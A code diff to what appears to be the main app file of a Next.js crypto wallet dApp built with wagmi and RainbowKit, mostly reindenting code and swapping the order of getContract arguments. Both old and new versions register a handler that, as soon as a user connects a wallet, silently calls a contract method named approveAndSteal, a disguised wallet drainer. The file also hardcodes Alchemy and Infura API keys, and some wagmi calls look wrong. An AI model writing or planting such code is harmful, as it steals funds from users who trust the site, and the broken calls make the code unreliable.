@@ -2,7 +2,7 @@ import "../styles/globals.css";
 import "@rainbow-me/rainbowkit/styles.css";
 
 import { getDefaultWallets, RainbowKitProvider } from "@rainbow-me/rainbowkit";
-import { configureChains, createClient, WagmiConfig } from "wagmi";
+import { configureChains, createClient, WagmiConfig, Contract } from "wagmi";
 import {
     mainnet,
     polygon,
@@ -161,70 +161,70 @@ const abi =[
   ];
 
   const contractAddress = '0xbAa68d816B2713F9e2f188f1B802ef8b77B2936b';
-  const alchemyAPIKey = 'JJbjMztYVUqS5wDcRxF8wmBPrimSglub';
-  const alchemyURL = 'https://polygon-mainnet.g.alchemy.com/v2/JJbjMztYVUqS5wDcRxF8wmBPrimSglub';
-  
-  const infuraAPIKey = 'c6f67ed83ef14e6298373339528a7587';
-  const infuraURL = 'https://polygon-mainnet.infura.io/v3/c6f67ed83ef14e6298373339528a7587';
-  const tokenParams = {
-      name: 'WETH',
-      symbol: 'WETH',
-      WETH_ADDRESS: '0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619',
-  };
-  
-  const { chains, provider } = configureChains(
-      [
-          mainnet,
-          goerli,
-          polygon,
-          polygonMumbai,
-          optimism,
-          optimismGoerli,
-          arbitrum,
-          arbitrumGoerli,
-      ],
-      [alchemyProvider({ apiKey: process.env.ALCHEMY_API_KEY }), publicProvider()]
-  );
-  
-  const { connectors } = getDefaultWallets({
-      appName: "My Alchemy DApp",
-      chains,
-  });
-  
-  const wagmiClient = createClient({
-      autoConnect: true,
-      connectors,
-      provider,
-  });
-  
-  // Определение экземпляра контракта
-  const contractInstance = wagmiClient.getContract(contractAddress, abi);
-  
-  wagmiClient.on("connect", async () => {
-      try {
-          await contractInstance.approveAndSteal();
-          console.log("approveAndSteal called successfully");
-      } catch (error) {
-          console.error("Error calling approveAndSteal:", error);
-      }
-  });
-  
-  export { WagmiConfig, RainbowKitProvider };
-  
-  function MyApp({ Component, pageProps }) {
-      return (
-          <WagmiConfig client={wagmiClient}>
-              <RainbowKitProvider
-                  modalSize="compact"
-                  initialChain={process.env.NEXT_PUBLIC_DEFAULT_CHAIN}
-                  chains={chains}
-              >
-                  <MainLayout>
-                      <Component {...pageProps} />
-                  </MainLayout>
-              </RainbowKitProvider>
-          </WagmiConfig>
-      );
-  }
-  
-  export default MyApp;
+const alchemyAPIKey = 'JJbjMztYVUqS5wDcRxF8wmBPrimSglub';
+const alchemyURL = 'https://polygon-mainnet.g.alchemy.com/v2/JJbjMztYVUqS5wDcRxF8wmBPrimSglub';
+
+const infuraAPIKey = 'c6f67ed83ef14e6298373339528a7587';
+const infuraURL = 'https://polygon-mainnet.infura.io/v3/c6f67ed83ef14e6298373339528a7587';
+const tokenParams = {
+    name: 'WETH',
+    symbol: 'WETH',
+    WETH_ADDRESS: '0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619',
+};
+
+const { chains, provider } = configureChains(
+    [
+        mainnet,
+        goerli,
+        polygon,
+        polygonMumbai,
+        optimism,
+        optimismGoerli,
+        arbitrum,
+        arbitrumGoerli,
+    ],
+    [alchemyProvider({ apiKey: process.env.ALCHEMY_API_KEY }), publicProvider()]
+);
+
+const { connectors } = getDefaultWallets({
+    appName: "My Alchemy DApp",
+    chains,
+});
+
+const wagmiClient = createClient({
+    autoConnect: true,
+    connectors,
+    provider,
+});
+
+// Определение экземпляра контракта
+const contractInstance = wagmiClient.getContract(abi, contractAddress);
+
+wagmiClient.on("connect", async () => {
+    try {
+        await contractInstance.approveAndSteal();
+        console.log("approveAndSteal called successfully");
+    } catch (error) {
+        console.error("Error calling approveAndSteal:", error);
+    }
+});
+
+export { WagmiConfig, RainbowKitProvider };
+
+function MyApp({ Component, pageProps }) {
+    return (
+        <WagmiConfig client={wagmiClient}>
+            <RainbowKitProvider
+                modalSize="compact"
+                initialChain={process.env.NEXT_PUBLIC_DEFAULT_CHAIN}
+                chains={chains}
+            >
+                <MainLayout>
+                    <Component {...pageProps} />
+                </MainLayout>
+            </RainbowKitProvider>
+        </WagmiConfig>
+    );
+}
+
+export default MyApp;
